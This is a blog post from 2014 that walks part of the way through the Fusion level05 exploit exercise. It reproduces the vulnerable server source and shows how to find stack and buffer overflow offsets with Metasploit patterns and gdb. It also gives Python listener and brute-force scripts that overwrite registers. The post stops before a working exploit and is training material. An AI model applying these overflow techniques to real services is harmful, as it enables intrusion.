

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Crowd-Solving Fusion level05</title>
    <meta name="description" content="">

    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="shortcut icon" href="../../../../../assets/favicon.png?v=d47df0f104">

    <link rel="stylesheet" type="text/css" href="../../../../../assets/css/screen.css?v=d47df0f104">
    <link href="http://fonts.googleapis.com/css?family=Open+Sans:400,700" rel="stylesheet" type="text/css">
    <link href="http://fonts.googleapis.com/css?family=Roboto" rel="stylesheet" type="text/css">

    <script type="text/javascript" src="../../../../../assets/js/jquery-1.11.1.min.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../../assets/js/jquery.fitvids.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../../assets/js/moment.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../../assets/js/handlebars.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../../assets/js/jquery.tapirus.js?v=d47df0f104"></script> 
    <script type="text/javascript" src="../../../../../assets/js/index.js?v=d47df0f104"></script>


    <link rel="canonical" href="http://www.pwntester.com/blog/2014/04/20/crowd-solving-fusion-level05/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="amphtml" href="http://www.pwntester.com/blog/2014/04/20/crowd-solving-fusion-level05/amp/">
    
    <meta property="og:site_name" content="&lt;/pwntester&gt;">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Crowd-Solving Fusion level05">
    <meta property="og:description" content="I played with Fusion level05 for a couple of days last Xmas and although I found how to smash the stack, I couldn't find any reliable way of leaking the .text base address to bypass PIE protection so I left it there. Yesterday, a tweet from @Newlog_ got me thinking">
    <meta property="og:url" content="http://www.pwntester.com/blog/2014/04/20/crowd-solving-fusion-level05/">
    <meta property="article:published_time" content="2014-04-20T10:57:00.000Z">
    <meta property="article:modified_time" content="2014-04-20T10:57:00.000Z">
    <meta property="article:tag" content="post">
    
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Crowd-Solving Fusion level05">
    <meta name="twitter:description" content="I played with Fusion level05 for a couple of days last Xmas and although I found how to smash the stack, I couldn't find any reliable way of leaking the .text base address to bypass PIE protection so I left it there. Yesterday, a tweet from @Newlog_ got me thinking">
    <meta name="twitter:url" content="http://www.pwntester.com/blog/2014/04/20/crowd-solving-fusion-level05/">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="pwntester">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="post">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "&lt;/pwntester&gt;",
        "logo": "http://www.pwntester.com/content/images/2014/May/rooted.jpeg"
    },
    "author": {
        "@type": "Person",
        "name": "pwntester",
        "image": {
            "@type": "ImageObject",
            "url": "//www.gravatar.com/avatar/d195407e71e25241001971f9fa5cca45?d=404",
            "width": 80,
            "height": 80
        },
        "url": "http://www.pwntester.com/author/pwntester/",
        "sameAs": []
    },
    "headline": "Crowd-Solving Fusion level05",
    "url": "http://www.pwntester.com/blog/2014/04/20/crowd-solving-fusion-level05/",
    "datePublished": "2014-04-20T10:57:00.000Z",
    "dateModified": "2014-04-20T10:57:00.000Z",
    "keywords": "post",
    "description": "I played with Fusion level05 for a couple of days last Xmas and although I found how to smash the stack, I couldn&#x27;t find any reliable way of leaking the .text base address to bypass PIE protection so I left it there. Yesterday, a tweet from @Newlog_ got me thinking",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "http://www.pwntester.com"
    }
}
    </script>

    <meta name="generator" content="Ghost 0.11">
    <link rel="alternate" type="application/rss+xml" title="&lt;/pwntester&gt;" href="http://www.pwntester.com/rss/">

    <link href="http://netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">

    <link rel="stylesheet" type="text/css" href="../../../../../assets/css/prism.css?v=d47df0f104">

    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-49973078-2', 'pwntester.com');
  ga('send', 'pageview');

</script></head>

<body class="post-template tag-post-tag">

    <div id="sidebar">
        <div id="sidebar-content" class="inner">
            <a class="blog-logo" href="http://www.pwntester.com"><img src="../../../../../content/images/2014/May/rooted.jpeg" alt="Blog Logo"></a>
            <h2 class="blog-title"><a href="http://www.pwntester.com">&lt;/pwntester&gt;</a>
            <h3 class="blog-description"></h3></h2>

            <!--form id="search">
                <input id="search-field" placeholder="Search"/>
            </form-->
            <form id="search">  
                <input id="search-field" type="search" placeholder="Search">
            </form>  

            <div id="sidebar-links">
                <ul id="subscription-links">
                    <li><a target="_blank" href="http://www.pwntester.com/rss/"><i class="fa fa-rss"></i> Subscribe via RSS</a></li>
                    <!-- No support yet
                    <li><a target="_blank" href=" "><i class="fa fa-envelope"></i> Subscribe via email<a></li>
                    -->
                </ul>
                <ul id="sidebar-internal">
                    <!-- For 'About' and other pages -->
                </ul>
                <ul id="sidebar-external">
                    <li class="external-link"><a href="https://github.com/pwntester"><i class="fa fa-github"></i> GitHub</a></li>
<li class="external-link"><a href="http://www.linkedin.com/in/alvaroms"><i class="fa fa-linkedin"></i> LinkedIn</a></li>
<li class="external-link"><a href="https://twitter.com/pwntester"><i class="fa fa-twitter"></i> Twitter</a></li>
<li class="external-link"><a target="_blank" href="mailto:alvaro@pwntester.com"><i class="fa fa-envelope"></i> Contact</a></li>
                </ul>
            </div>

            <footer class="site-footer">
                <section class="copyright">© 2017 <a href="mailto:alvaro@pwntester.com">Alvaro Muñoz</a> • All rights reserved.</section>
            </footer>
        </div>
    </div>

    <main>
        <section id="results"></section>
        

<article class="post tag-post-tag">


        <span class="post-meta"><time datetime="2014-04-20">20 Apr 2014</time> on <a href="../../../../../tag/post-tag/">post</a></span>

        <h1 class="post-title">Crowd-Solving Fusion level05</h1>

        <section class="post-content">
            <p>I played with Fusion level05 for a couple of days last Xmas and although I found how to smash the stack, I couldn't find any reliable way of leaking the .text base address to bypass PIE protection so I left it there. Yesterday, a tweet from <a href="https://twitter.com/Newlog_">@Newlog_</a> got me thinking it could be a good idea to post what I've done so far in case anyone wants to pick it from there and help solving the level. Lets call this crowd-solving :-D</p>

<p>So lets get the ball rolling:</p>

<p>In <a href="http://exploit-exercises.com/fusion/level05">level05</a> we are given the following server code:</p>

<pre><code class="language-lang-clike line-numbers ">#include "../common/common.c"

#include &lt;task.h&gt;

#define STACK (4096 * 8)

unsigned int hash(unsigned char *str, int length, unsigned int mask)  
{
  unsigned int h = 0xfee13117;
  int i;

  for(h = 0xfee13117, i = 0; i &lt; length; i++) {
    h ^= str[i];
    h += (h &lt;&lt; 11);
    h ^= (h &gt;&gt; 7);
    h -= str[i];
  }
  h += (h &lt;&lt; 3);
  h ^= (h &gt;&gt; 10);
  h += (h &lt;&lt; 15);
  h -= (h &gt;&gt; 17);

  return (h &amp; mask);
}

void fdprintf(int fd, char *fmt, ...)  
{
  va_list ap;
  char *msg = NULL;

  va_start(ap, fmt);
  vasprintf(&amp;msg, fmt, ap);
  va_end(ap);

  if(msg) {
    fdwrite(fd, msg, strlen(msg));
    free(msg);
  }
}

struct registrations {  
  short int flags;
  in_addr_t ipv4;
} __attribute__((packed));

#define REGDB (128)
struct registrations registrations[REGDB];

static void addreg(void *arg)  
{
  char *name, *sflags, *ipv4, *p;
  int h, flags;
  char *line = (char *)(arg);

  name = line;
  p = strchr(line, ' ');
  if(! p) goto bail;
  *p++ = 0;
  sflags = p;
  p = strchr(p, ' ');
  if(! p) goto bail;
  *p++ = 0;
  ipv4 = p;

  flags = atoi(sflags);
  if(flags &amp; ~0xe0) goto bail;

  h = hash(name, strlen(name), REGDB-1);
  registrations[h].flags = flags;
   registrations[h].ipv4 = inet_addr(ipv4);

  printf("registration added successfully\n");

bail:  
  free(line);
}

static void senddb(void *arg)  
{
  unsigned char buffer[512], *p;
  char *host, *l;
  char *line = (char *)(arg);
  int port;
  int fd;
  int i;
  int sz;

  p = buffer;
  sz = sizeof(buffer);
  host = line;
  l = strchr(line, ' ');
  if(! l) goto bail;
  *l++ = 0;
  port = atoi(l);
  if(port == 0) goto bail;

  printf("sending db\n");

  if((fd = netdial(UDP, host, port)) &lt; 0) goto bail;

  for(sz = 0, p = buffer, i = 0; i &lt; REGDB; i++) {
    if(registrations[i].flags | registrations[i].ipv4) {
      memcpy(p, &amp;registrations[i], sizeof(struct registrations));
      p += sizeof(struct registrations);
      sz += sizeof(struct registrations);
    }
  }
bail:  
  fdwrite(fd, buffer, sz);
  close(fd);
  free(line);
}

int get_and_hash(int maxsz, char *string, char separator)  
{
  char name[32];
  int i;

  if(maxsz &gt; 32) return 0;

  for(i = 0; i &lt; maxsz, string[i]; i++) {
    if(string[i] == separator) break;
    name[i] = string[i];
  }

  return hash(name, strlen(name), 0x7f);
}


struct isuparg {  
  int fd;
  char *string;
};


static void checkname(void *arg)  
{
  struct isuparg *isa = (struct isuparg *)(arg);
  int h;

  h = get_and_hash(32, isa-&gt;string, '@');

  fdprintf(isa-&gt;fd, "%s is %sindexed already\n", isa-&gt;string, registrations[h].ipv4 ? "" : "not ");

}

static void isup(void *arg)  
{
  unsigned char buffer[512], *p;
  char *host, *l;
  struct isuparg *isa = (struct isuparg *)(arg);
  int port;
  int fd;
  int i;
  int sz;

  // skip over first arg, get port
  l = strchr(isa-&gt;string, ' ');
  if(! l) return;
  *l++ = 0;

  port = atoi(l);
  host = malloc(64);

  for(i = 0; i &lt; 128; i++) {
    p = (unsigned char *)(&amp; registrations[i]);
    if(! registrations[i].ipv4) continue;

    sprintf(host, "%d.%d.%d.%d",
      (registrations[i].ipv4 &gt;&gt; 0) &amp; 0xff,
      (registrations[i].ipv4 &gt;&gt; 8) &amp; 0xff,
      (registrations[i].ipv4 &gt;&gt; 16) &amp; 0xff,
      (registrations[i].ipv4 &gt;&gt; 24) &amp; 0xff);

    if((fd = netdial(UDP, host, port)) &lt; 0) {
      continue;
    }

    buffer[0] = 0xc0;
    memcpy(buffer + 1, p, sizeof(struct registrations));
    buffer[5] = buffer[6] = buffer[7] = 0;

    fdwrite(fd, buffer, 8);

    close(fd);
  }

  free(host);
}

static void childtask(void *arg)  
{
  int cfd = (int)(arg);
  char buffer[512], *n;
  int r;


  n = "** welcome to level05 **\n";

  if(fdwrite(cfd, n, strlen(n)) &lt; 0) goto bail;

  while(1) {
    if((r = fdread(cfd, buffer, 512)) &lt;= 0) goto bail;

    n = strchr(buffer, '\r');
    if(n) *n = 0;
    n = strchr(buffer, '\n');
    if(n) *n = 0;

    if(strncmp(buffer, "addreg ", 7) == 0) {
      taskcreate(addreg, strdup(buffer + 7), STACK);
      continue;
    }

    if(strncmp(buffer, "senddb ", 7) == 0) {
      taskcreate(senddb, strdup(buffer + 7), STACK);
      continue;
    }

    if(strncmp(buffer, "checkname ", 10) == 0) {
      struct isuparg *isa = calloc(sizeof(struct isuparg), 1);

      isa-&gt;fd = cfd;
      isa-&gt;string = strdup(buffer + 10);

      taskcreate(checkname, isa, STACK);
      continue;
    }

    if(strncmp(buffer, "quit", 4) == 0) {
      break;
    }

    if(strncmp(buffer, "isup ", 5) == 0) {
      struct isuparg *isa = calloc(sizeof(struct isuparg), 1);
      isa-&gt;fd = cfd;
      isa-&gt;string = strdup(buffer + 5);
      taskcreate(isup, isa, STACK);
    }
  }

bail:  
  close(cfd);
}

void taskmain(int argc, char **argv)  
{
  int fd, cfd;
  char remote[16];
  int rport;

  signal(SIGPIPE, SIG_IGN);
  background_process(NAME, UID, GID);

  if((fd = netannounce(TCP, 0, PORT)) &lt; 0) {
    fprintf(stderr, "failure on port %d: %s\n", PORT, strerror(errno));
    taskexitall(1);
  }

  fdnoblock(fd);

  while((cfd = netaccept(fd, remote, &amp;rport)) &gt;= 0) {
    fprintf(stderr, "accepted connection from %s:%d\n", remote, rport);
    taskcreate(childtask, (void *)(cfd), STACK);
  }



}
</code></pre>

<p>The server takes different commands as input:</p>

<ul>
<li>addreg [name] [flags] [ip]: Register an IP with a given flags (32,96 or 224) and store it in an array with an index provided by a custom hash function of the given name</li>
<li>senddb [ip] [port]: Sends all the registered IPs to the given ip and port using UDP</li>
<li>isup [skipped] [port]: Loop through all the ips registered and for those with a valid ip, it sends the details to that ip and the provided port</li>
<li>checkname [name]: Calculate the custom hash of the given name and checks if the registration array contains a valid ip for that hash</li>
<li>quit: Exit</li>
</ul>

<p>There are a couple of overflows that we can abuse:</p>

<p>The first one is on <code>get_and_hash</code>  "for" loop:</p>

<pre><code class="language-lang-clike line-numbers ">for(i = 0; i &lt; maxsz, string[i]; i++) {  
  if(string[i] == separator) break;
   name[i] = string[i];
}
</code></pre>

<p>The loop wont stop at <code>maxsz</code> allowing writing beyond the limits of the "name" buffer (32). We can quickly verify this using <strong>metasploit</strong> to find the right overflow offet:</p>

<pre><code class="language-lang-bash line-numbers ">fusion@fusion:~$ /opt/metasploit-framework/tools/pattern_create.rb 64  
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A  
</code></pre>

<pre><code class="language-lang-bash line-numbers ">fusion@fusion:~$ nc localhost 20005  
** welcome to level05 **
checkname Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A  
</code></pre>

<p>Monitoring the process with gdb we get:</p>

<pre><code class="language-lang-bash line-numbers ">(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.  
0x35624134 in ?? ()  
</code></pre>

<p>That corresponds to offset 44:</p>

<pre><code class="language-lang-bash line-numbers ">fusion@fusion:~$ /opt/metasploit-framework/tools/pattern_offset.rb 35624134  
44  
</code></pre>

<p>This allows us to write beyond "name" buffer limits and into the stored base pointer and instruction pointer. Actually looks like a nice place to place our payload:</p>

<pre><code class="language-lang-bash line-numbers ">(gdb) x/100wx $esp
0xb940cc6c:    0x44444444  0x42424242  0x42424242  0x42424242  
0xb940cc7c:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940cc8c:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940cc9c:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940ccac:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940ccbc:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940cccc:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940ccdc:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940ccec:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940ccfc:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940cd0c:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940cd1c:    0x42424242  0x42424242  0x42424242  0x42424242  
0xb940cd2c:    0x42424242  0x42424242  0x42424242  0x00000000  
</code></pre>

<p>There is another overflow that we cannot exploit since there is a call to <code>free(line)</code> before returning from the function that crash the application. This one is in the <code>senddb</code> function:</p>

<pre><code class="language-lang-bash line-numbers ">unsigned char buffer[512], *p;  
..
..
for(sz = 0, p = buffer, i = 0; i &lt; REGDB; i++) {  
  if(registrations[i].flags | registrations[i].ipv4) {
    memcpy(p, &amp;registrations[i], sizeof(struct registrations));
    p += sizeof(struct registrations);
    sz += sizeof(struct registrations);
  }
}
bail:  
  fdwrite(fd, buffer, sz);
  close(fd);
  free(line);
</code></pre>

<p><code>buffer</code> is 512 bytes long but we can overwrite it with 128 (REGDB) registrations which are 6 bytes long each. So with 85 of them we can overwrite the destination buffer.
The problem is that <code>line</code> will also be affected and the call to <code>free(line)</code> will segfault before getting to <code>ret</code></p>

<p>This was one of the first vectors I tried to use to leak the binary base address since we can overwrite some registers before crashing that could leak the base address plus a fixed offset. However there is no difference in the application behaviour that we can use to know if we overwrote those register bytes with the right values or not (as we did for <a href="http://www.pwntester.com/blog/2013/12/31/fusion-level04-write-up/">level04</a>)</p>

<p>Anyway if someone wants to give it a try they will first need to set up a listener for the info coming from the <code>senddb</code> fdwrite function. I wrote this listener that works on port 6666/UDP and that works for <code>senddb</code> and <code>isup</code> commands:</p>

<pre><code class="language-lang-python line-numbers ">#!/usr/bin/python

from socket import *  
from struct import *

s = socket(AF_INET, SOCK_DGRAM)  
s.bind(('0.0.0.0', 6666))  
while True:  
    data =  s.recv(1024)
    print("[+] Received UDP packet with length {0}: {1}".format(len(data), data.encode("hex")))
    if data[:1].encode("hex") == "c0":
        print("[+] Received ISUP packet {0}".format(data.encode("hex")))
        print("[+]   Control char: " + data[:1].encode("hex"))
        flags = unpack("&lt;H", data[1:3])[0]
        print("[+]   Flags: {0}".format(int(flags),16))
        # Not printing the ip since we miss a byte and since it will always be our own ip otherwise we could not receive it
        #reg = unpack("&lt;I", data[3:7])[0]
        #print("[+]   3 bytes from address: {0}".format(reg))
    else:
        i = 0
        print("[+] Received SENDDB packet with {0} registrations".format(len(data)/6))
        while i &lt; len(data):
                reg = data[i:i+6]
                print("[+] Received SENDDB packet {0}".format(reg.encode("hex")))
                flags = unpack("&lt;H", reg[0:2])[0]
                print("[+]   Flags: {0}".format(int(flags),16))
                host = unpack("&lt;I", reg[2:6])[0]
                print("[+]   Host ({2}) IP: {0} ({1})".format(inet_ntoa(reg[2:6]),reg[2:6].encode("hex"),(i+6)/6))
                i += 6
</code></pre>

<p>Using this listener and the following bruteforce client script, we can find which names generate the right hashes to overwrite ebp, ebx, eip ...</p>

<pre><code class="language-lang-python line-numbers ">#!/usr/bin/python

from socket import *  
from struct import *

s = socket(AF_INET, SOCK_STREAM)  
s.connect(("localhost", 20005))  
for i in xrange(139):  
        if i == 84:
                # EBP
                payload = "addreg {0} 32 {1}\n".format(i,inet_ntoa("\x44\x44\x44\x44"))
        elif i == 50:
                # EBX
                payload = "addreg {0} 32 {1}\n".format(i,inet_ntoa("\x41\x41\x41\x41"))
        else:
                payload = "addreg {0} 32 127.0.0.{0}\n".format(i)
        s.send(payload)
s.send("senddb 127.0.0.1 6666\n")  
s.close()  
</code></pre>

<p>Running the script will get us the following packets in our listener:</p>

<pre><code class="language-lang-bash line-numbers ">fusion@fusion:~$ python fusion05-senddb.py  
..
..
[+]   Host (86) IP: 127.0.0.70 (7f000046)
[+]   Host (87) IP: 127.0.0.69 (7f000045)
[+]   Host (88) IP: 127.0.0.137 (7f000089)
[+]   Host (89) IP: 65.65.65.65 (41414141)
[+]   Host (90) IP: 127.0.0.87 (7f000057)
[+]   Host (91) IP: 68.68.68.68 (44444444)
</code></pre>

<p>It turns out that we need 139 different "names" to produce 91 unique hashes that are the ones required to overflow the buffer (not 85 as we calculated) <br>
The problem is that the 91 registration also overwrites the argument to <code>free(line)</code> as shown in GDB right before calling <code>free()</code></p>

<p>In the first overflow (the <code>get_and_hash()</code> one), we overwrite <code>esi</code> and <code>edi</code> which change on every request before overwriting <code>ebp</code> and <code>eip</code>. Overwriting <code>ebp</code> byte a byte can leak the binary load offset but in order to do so we have to overwrite <code>esi</code> with an address with write permissions (since "checkname" contains the following instruction after leaving <code>get_and_hash</code>: <code>&lt;checkname+107&gt;: mov (%esi),%eax</code>) and even guessing a good one, overwriting <code>ebp</code> does not change the server behaviour to make educated guesses about the right <code>ebp</code> value. So this looks like a dead end for my newbie skills.</p>

<p>So here I am stucked, any ideas?</p>
        </section>

        <footer class="post-footer">

            <section class="author">
                <div class="author-image">
                     <img src="http://www.gravatar.com/avatar/d195407e71e25241001971f9fa5cca45?d=404" alt="pwntester"> 
                </div>
                <div class="author-text">
                    <h4>pwntester</h4>
                    <p></p>
                    <div class="author-meta clearfix">
                        
                        
                    </div>
                </div>
            </section>

            <section class="share">
                <h4>Share this post</h4>
                <div class="share-icons">
                    <a class="fa fa-twitter-square" href="https://twitter.com/share?text=Crowd-Solving%20Fusion%20level05&amp;url=http://www.pwntester.com/blog/2014/04/20/crowd-solving-fusion-level05/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
                        <span class="hidden">Twitter</span>
                    </a>
                    <a class="fa fa-facebook-square" href="https://www.facebook.com/sharer/sharer.php?u=http://www.pwntester.com/blog/2014/04/20/crowd-solving-fusion-level05/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
                        <span class="hidden">Facebook</span>
                    </a>
                    <a class="fa fa-google-plus-square" href="https://plus.google.com/share?url=http://www.pwntester.com/blog/2014/04/20/crowd-solving-fusion-level05/" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
                        <span class="hidden">Google+</span>
                    </a>
                </div>
            </section>

        </footer>

        <section class="post-comments">
            <div id="disqus_thread"></div>
            <script type="text/javascript">
                /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
                var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
                /* * * DON'T EDIT BELOW THIS LINE * * */
                (function() {
                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
                })();
            </script>
            <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
            <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
        </section>


</article>
    </main>

    <!-- You can safely delete this line if your theme does not require jQuery -->
<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>

    <script src="../../../../../assets/js/instantclick.min.js?v=d47df0f104" data-no-instant></script>
    <script data-no-instant>InstantClick.init();</script>
    <script data-no-instant>
        InstantClick.on('change', function() {
            prism_markdown();
            Prism.highlightAll();
        });
        InstantClick.init();
    </script>

    <script type="text/javascript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function () {
            var s = document.createElement('script'); s.async = true;
            s.type = 'text/javascript';
            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
    </script>

    <script type="text/javascript" src="../../../../../assets/js/prism-loader.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../../assets/js/prism.js?v=d47df0f104"></script>

</body>

